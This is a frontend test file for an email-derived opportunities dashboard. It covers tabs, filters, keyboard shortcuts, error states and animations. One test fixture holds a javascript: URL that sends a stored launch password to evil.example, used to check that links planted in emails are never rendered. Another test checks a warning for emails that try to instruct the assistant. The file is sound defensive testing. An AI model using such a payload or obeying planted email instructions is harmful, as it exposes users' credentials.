import { act, fireEvent, screen, waitFor, within } from "@testing-library/react"
import userEvent from "@testing-library/user-event"
import { expect, test, vi } from "vitest"
import { detail, row, type Row } from "@/test/fixtures"
import { engine, location, renderApp } from "@/test/renderApp"

const TAB_TOTALS: Record<string, number> = { for_you: 3, all: 5, starred: 1, applied: 0, dismissed: 2 }

/** The fake engine's opportunities: `items` for the list; each tab's own total for limit=1 count requests. */
function opportunities(items: Row[], answers: Record<string, unknown> = {}) {
  return engine({
    "/api/opportunities": (url: URL) => {
      const tab = url.searchParams.get("tab") ?? "for_you"
      if (url.searchParams.get("limit") === "1") return { tab_total: TAB_TOTALS[tab], total: TAB_TOTALS[tab], items: [] }
      const filtered = url.searchParams.has("kind") ? items.filter((r) => r.kind === url.searchParams.get("kind")) : items
      return { tab_total: items.length, total: filtered.length, items: filtered }
    },
    "/api/emails": { items: [], truncated: false },
    ...answers,
  })
}

const press = (key: string) => act(() => {
  fireEvent.keyDown(window, { key })
})

test("tabs show counts from each tab's total", async () => {
  renderApp("/opportunities", opportunities([row(1), row(2), row(3)]))
  const tabs = await screen.findByRole("tablist")
  await waitFor(() => expect(within(tabs).getByRole("tab", { name: /For you/ })).toHaveTextContent("3"))
  expect(within(tabs).getByRole("tab", { name: /All/ })).toHaveTextContent("5")
  expect(within(tabs).getByRole("tab", { name: /Dismissed/ })).toHaveTextContent("2")
  expect(within(tabs).getByRole("tab", { name: /For you/ })).toHaveAttribute("aria-selected", "true")
})

test("filters hide items and Clear brings them back", async () => {
  const items = [row(1, { kind: "hackathon" }), row(2), row(3)]
  const { router } = renderApp("/opportunities?tab=all&kind=hackathon", opportunities(items))
  expect(await screen.findByText("2 hidden by filters")).toBeInTheDocument()
  await userEvent.click(screen.getByRole("button", { name: "Clear" }))
  expect(location(router)).toBe("/opportunities?tab=all")
  await waitFor(() => expect(screen.queryByText(/hidden by filters/)).toBeNull())
})

test("Applied disappears from For you at once and comes back if the call fails", async () => {
  let release!: () => void
  const held = new Promise<void>((resolve) => (release = resolve))
  renderApp("/opportunities", opportunities([row(1, { title: "AI Engineer Intern" }), row(2)], {
    "/api/opportunities/1/applied": async () => {
      await held
      return new Response("Internal Server Error", { status: 500 })
    },
  }))
  const title = await screen.findByText("AI Engineer Intern")
  const item = title.closest("[data-row]") as HTMLElement
  await userEvent.click(within(item).getByRole("button", { name: "Applied" }))
  await waitFor(() => expect(screen.queryByText("AI Engineer Intern")).toBeNull())
  release()
  expect(await screen.findByText("Couldn't mark it applied. Try again.")).toBeInTheDocument()
  expect(await screen.findByText("AI Engineer Intern")).toBeInTheDocument()
})

test("a successful action says so", async () => {
  renderApp("/opportunities", opportunities([row(1, { title: "AI Engineer Intern" })], {
    "/api/opportunities/1/dismiss": () => row(1, { status: "dismissed" }),
  }))
  const item = (await screen.findByText("AI Engineer Intern")).closest("[data-row]") as HTMLElement
  await userEvent.click(within(item).getByRole("button", { name: "Dismiss" }))
  expect(await screen.findByRole("status")).toHaveTextContent("Dismissed")
})

test("the panel shows the breakdown and each sighting's Gmail link", async () => {
  renderApp("/opportunities?tab=all&id=1", opportunities([row(1)], {
    "/api/opportunities/1": detail(1, { title: "HCMC AI Hackathon 2026", score: 92 }),
  }))
  const panel = await screen.findByRole("complementary", { name: "HCMC AI Hackathon 2026" })
  expect(within(panel).getByText("Interests: AI")).toBeInTheDocument()
  expect(within(panel).getByText("+40")).toBeInTheDocument()
  expect(within(panel).getByText("University students")).toBeInTheDocument()
  expect(within(panel).getByRole("link", { name: /Open in Gmail/ })).toHaveAttribute("href", "https://mail.google.com/mail/#all/m1")
  expect(within(panel).getByRole("link", { name: /Open link/ })).toHaveAttribute("href", "https://example.com/1")
})

test("a flagged email's item says so in alert red", async () => {
  renderApp("/opportunities?tab=all&id=1", opportunities([row(1)], { "/api/opportunities/1": detail(1, { flagged: true }) }))
  const warning = await screen.findByText("This email tried to give the assistant instructions.")
  expect(warning.closest("[data-severity]")).toHaveClass("text-alert")
})

test("Esc closes the panel", async () => {
  const { router } = renderApp("/opportunities?tab=all&id=1", opportunities([row(1)], { "/api/opportunities/1": detail(1) }))
  await screen.findByRole("complementary", { name: "Opportunity 1" })
  press("Escape")
  expect(location(router)).toBe("/opportunities?tab=all")
})

test("j, j, a marks the second row applied", async () => {
  const { calls } = renderApp("/opportunities", opportunities([row(1), row(2), row(3)], {
    "/api/opportunities/2/applied": () => row(2, { status: "applied" }),
  }))
  await screen.findByText("Opportunity 2")
  press("j"); press("j"); press("a")
  await waitFor(() => expect(calls.some((c) => c.method === "POST" && new URL(c.url).pathname === "/api/opportunities/2/applied")).toBe(true))
})

test("Enter opens the selected row in the panel", async () => {
  const { router } = renderApp("/opportunities", opportunities([row(1), row(2)], { "/api/opportunities/1": detail(1) }))
  await screen.findByText("Opportunity 1")
  press("j"); press("Enter")
  expect(location(router)).toBe("/opportunities?id=1")
})

test("long titles stay on one line with the full title on hover", async () => {
  // Review Focus 1
  const title = "Cuộc thi Khởi nghiệp Đổi mới Sáng tạo dành cho Sinh viên các trường Đại học Example năm 2026 (vòng chung kết)"
  renderApp("/opportunities", opportunities([row(1, { title })]))
  const shown = await screen.findByText(title)
  expect(shown).toHaveClass("truncate")
  expect(shown).toHaveAttribute("title", title)
})

test("an empty tab shows its empty state", async () => {
  // Review Focus 3
  renderApp("/opportunities?tab=applied", opportunities([]))
  expect(await screen.findByText("No opportunities here yet.")).toBeInTheDocument()
})

test("only the first row of For you is the top pick", async () => {
  renderApp("/opportunities", opportunities([row(1), row(2)]))
  await screen.findByText("Opportunity 2")
  expect(screen.getAllByLabelText("Top pick")).toHaveLength(1)
})

test("a link planted in an email is never clickable", async () => {
  // The model writes `url` from email text; a javascript: link would run inside the dashboard
  renderApp("/opportunities?tab=all&id=1", opportunities([row(1)], {
    "/api/opportunities/1": detail(1, { title: "Free laptop", url: "javascript:fetch('https://evil.example/'+sessionStorage.getItem('pocket.launchPassword'))" }),
  }))
  const panel = await screen.findByRole("complementary", { name: "Free laptop" })
  expect(within(panel).queryByRole("link", { name: /Open link/ })).toBeNull()
  expect(panel.innerHTML).not.toContain("javascript:")
})

test("only the For you tab marks a top pick", async () => {
  renderApp("/opportunities?tab=all", opportunities([row(1), row(2)]))
  await screen.findByText("Opportunity 2")
  expect(screen.queryAllByLabelText("Top pick")).toHaveLength(0)
})

test("a failed list load says so instead of a blank list, and Try again loads it", async () => {
  let fail = true
  const working = opportunities([row(1, { title: "AI Engineer Intern" })])
  renderApp("/opportunities", async (request) => {
    const url = new URL(request.url)
    if (fail && url.pathname === "/api/opportunities" && url.searchParams.get("limit") === "1000") return Response.json({ detail: "busy" }, { status: 500 })
    return working(request)
  })
  expect(await screen.findByText("Couldn't load this from the engine.")).toBeInTheDocument()
  fail = false
  await userEvent.click(screen.getByRole("button", { name: "Try again" }))
  expect(await screen.findByText("AI Engineer Intern")).toBeInTheDocument()
})

test("the filter takes at most 100 characters, the engine's limit", async () => {
  renderApp("/opportunities", opportunities([row(1)]))
  expect(await screen.findByLabelText("Filter")).toHaveAttribute("maxlength", "100")
})

test("a failed refresh keeps the list that is already showing", async () => {
  let fail = false
  const working = opportunities([row(1, { title: "AI Engineer Intern" })])
  const { queryClient } = renderApp("/opportunities", async (request) =>
    fail ? Response.json({ detail: "busy" }, { status: 500 }) : working(request))
  expect(await screen.findByText("AI Engineer Intern")).toBeInTheDocument()
  fail = true
  await act(() => queryClient.refetchQueries())
  await act(() => new Promise((resolve) => setTimeout(resolve, 0))) // TanStack re-renders on the next tick
  expect(screen.getByText("AI Engineer Intern")).toBeInTheDocument()
  expect(screen.queryByText("Couldn't load this from the engine.")).toBeNull()
})

test("a jump elsewhere (Ctrl+K, the sidebar, Back) clears the text filter instead of writing it back", async () => {
  const { router } = renderApp("/opportunities?q=hack", opportunities([row(1)], { "/api/opportunities/1": detail(1) }))
  expect(await screen.findByLabelText("Filter")).toHaveValue("hack")
  await act(() => router.navigate("/opportunities?tab=all&id=1"))
  await act(() => new Promise((resolve) => setTimeout(resolve, 300))) // past the filter's 200 ms pause
  expect(location(router)).toBe("/opportunities?tab=all&id=1")
  expect(screen.getByLabelText("Filter")).toHaveValue("")
  await act(() => router.navigate(-1)) // Back to the filtered list: the box follows
  expect(screen.getByLabelText("Filter")).toHaveValue("hack")
})

test("Back to a filter typed in this box brings the text back and keeps it", async () => {
  const { router } = renderApp("/opportunities", opportunities([row(1)], { "/api/opportunities/1": detail(1) }))
  await userEvent.type(await screen.findByLabelText("Filter"), "hack")
  await waitFor(() => expect(location(router)).toBe("/opportunities?q=hack"))
  await act(() => router.navigate("/opportunities?tab=all&id=1"))
  await act(() => router.navigate(-1))
  await act(() => new Promise((resolve) => setTimeout(resolve, 300)))
  expect(screen.getByLabelText("Filter")).toHaveValue("hack")
  expect(location(router)).toBe("/opportunities?q=hack")
})

test("j and k bring the selected row into view", async () => {
  const scrolled = vi.spyOn(Element.prototype, "scrollIntoView")
  renderApp("/opportunities", opportunities([row(1), row(2), row(3)]))
  await waitFor(() => expect(document.querySelectorAll("[data-row]")).toHaveLength(3))
  await press("j"); await press("j")
  expect(scrolled.mock.contexts.at(-1)).toBe(document.querySelector('[data-row="2"]'))
  expect(scrolled).toHaveBeenLastCalledWith({ block: "nearest" })
  scrolled.mockRestore()
})

const level = (element: Element) => Number((element as HTMLElement).style.getPropertyValue("--i"))

test("rows arrive one by one for the first 8, then together", async () => {
  const items = Array.from({ length: 12 }, (_, i) => row(i + 1))
  renderApp("/opportunities", opportunities(items))
  await waitFor(() => expect(document.querySelectorAll("[data-row]")).toHaveLength(12))
  const rows = [...document.querySelectorAll("[data-row]")]
  expect(rows.map(level)).toEqual([3, 4, 5, 6, 7, 8, 9, 10, 11, 11, 11, 11])
  for (const element of rows) expect(element).toHaveClass("arrive")
  expect(level(screen.getByRole("heading", { name: "Opportunities" }))).toBe(0)
})

test("a refresh keeps the rows that stay where they are", async () => {
  const { queryClient } = renderApp("/opportunities", opportunities([row(1), row(2)]))
  await waitFor(() => expect(document.querySelector('[data-row="1"]')).not.toBeNull())
  const before = document.querySelector('[data-row="1"]')
  await act(() => queryClient.refetchQueries())
  await act(() => new Promise((resolve) => setTimeout(resolve, 0)))
  expect(document.querySelector('[data-row="1"]')).toBe(before)
})

test("switching between For you, All and the other tabs replays the arrival", async () => {
  renderApp("/opportunities", opportunities([row(1)]))
  await waitFor(() => expect(document.querySelector('[data-row="1"]')).not.toBeNull())
  await userEvent.click(screen.getByRole("tab", { name: /All/ }))
  await waitFor(() => expect(document.querySelector('[data-row="1"]')).not.toBeNull())
  await userEvent.click(screen.getByRole("tab", { name: /For you/ }))
  const before = document.querySelector('[data-row="1"]') // both tabs are cached now: rows show at once
  expect(before).not.toBeNull()
  await userEvent.click(screen.getByRole("tab", { name: /All/ }))
  expect(document.querySelector('[data-row="1"]')).not.toBe(before)
})
